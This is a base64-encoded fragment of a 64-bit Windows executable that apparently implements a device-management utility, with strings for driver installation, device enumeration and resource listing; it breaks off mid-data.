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AAAAAAAwZABAAQAAAHBpAEABAAAAAAAAAAAAAACQJwAAEDoAAFA7AAAgPQAAgEAAAMBBAACQQgAAUEMAACBEAADwRAAAkEUAADBGAAAARwAA0EcAAEBJAADASgAAUEwAAOBNAAAgTgAAkE8AAJBRAABwUgAAwFMAAEBVAADwVQAAEFsAANBeAADwXwAA8GAAAGBiAAAwZAAAAGUAABBnAACgZwAAMGkAAHBpAADgawAA8GsAAAAAAAAAAAAAICAgIAAAAABTAGUAUwBoAHUAdABkAG8AdwBuAFAAcgBpAHYAaQBsAGUAZwBlAAAAOgA9AAAAAAA/AAAAAAAAACUALQA2ADAAcwA6ACAAJQBzAAoAAAAAACUAcwAKAAAAKAA/ACkAAAB7AH0AAAAAAE0ARQBNACAAOgAgACUAMAA4AEkANgA0AHgALQAlADAAOABJADYANAB4AAoAAAAAAEkATwAgACAAOgAgACUAMAA0AEkANgA0AHgALQAlADAANABJADYANAB4AAoAAAAAAEQATQBBACAAOgAgACUAdQAKAAAAAAAAAEkAUgBRACAAOgAgACUAdQAKAAAAAAAAAEkAbgBmAFAAYQB0AGgAAABQAHIAbwB2AGkAZABlAHIATgBhAG0AZQAAAAAAAAAAAEkAbgBmAFMAZQBjAHQAaQBvAG4AAAAAAEQAcgBpAHYAZQByAEQAZQBzAGMAAAAAAFUAcABwAGUAcgBGAGkAbAB0AGUAcgBzAAAAAAAAAAAATABvAHcAZQByAEYAaQBsAHQAZQByAHMAAAAAAAAAAABQAHIAbwB2AGkAZABlAHIAAAAAAAAAAABWAGUAcgBzAGkAbwBuAAAAQwBsAGEAcwBzAEcAVQBJAEQAAAAAAAAAcwBlAHQAdQBwAGEAcABpAC4AZABsAGwAAAAAAAAAAABTZXR1cFZlcmlmeUluZkZpbGUAAAAAAABEAHIAaQB2AGUAcgBWAGUAcgAAAAoAAAAlAC0AMgAwAHMAOgAgACUAcwAKAAAAAABuAGUAdwBkAGUAdgAuAGQAbABsAAAAAABVcGRhdGVEcml2ZXJGb3JQbHVnQW5kUGxheURldmljZXNXAAAAAAAAU2V0dXBTZXROb25JbnRlcmFjdGl2ZU1vZGUAAAAAAAB1AHAAcABlAHIAAAAAAAAAbABvAHcAZQByAAAAAAAAACUALQA2ADAAcwA6ACAAAAAsAAAAJQBzAAAAAAAKAAAAU2V0dXBVbmluc3RhbGxPRU1JbmZXAAAAXABJAE4ARgBcAE8ARQBNACoALgBJAE4ARgAAAAAAAABjAGwAYQBzAHMAZgBpAGwAdABlAHIAAABjAGwAYQBzAHMAZQBzAAAAZABpAHMAYQBiAGwAZQAAAGQAcgBpAHYAZQByAGYAaQBsAGUAcwAAAGQAcgB